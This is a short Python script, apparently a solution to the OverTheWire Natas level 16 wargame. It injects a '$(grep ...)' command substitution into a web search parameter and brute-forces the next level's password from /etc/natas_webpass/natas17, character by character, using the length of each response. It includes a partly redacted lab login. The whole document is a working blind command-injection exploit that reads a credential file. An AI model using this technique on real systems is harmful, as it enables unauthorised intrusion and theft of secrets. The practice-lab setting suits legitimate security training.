from requests import request as req

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hP...Go")


def request(cmd: str):
    res = req(
        url=f"{url}?needle={cmd}&submit=Search",
        method="GET",
        auth=auth,
    )

    return res.text


def main():
    NOT_SEARCHED_LENGTH = 481
    candidate = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    answer = ""
    # 비밀번호 자리수 만큼 반복
    for _ in range(32):
        for c in candidate:
            print(answer + c)
            cmd = f"$(grep ^{answer + c} /etc/natas_webpass/natas17)"
            text = request(cmd)
            if len(text) <= NOT_SEARCHED_LENGTH:
                answer += c
                break


# main()
request("sdfasdfasdfsdf")
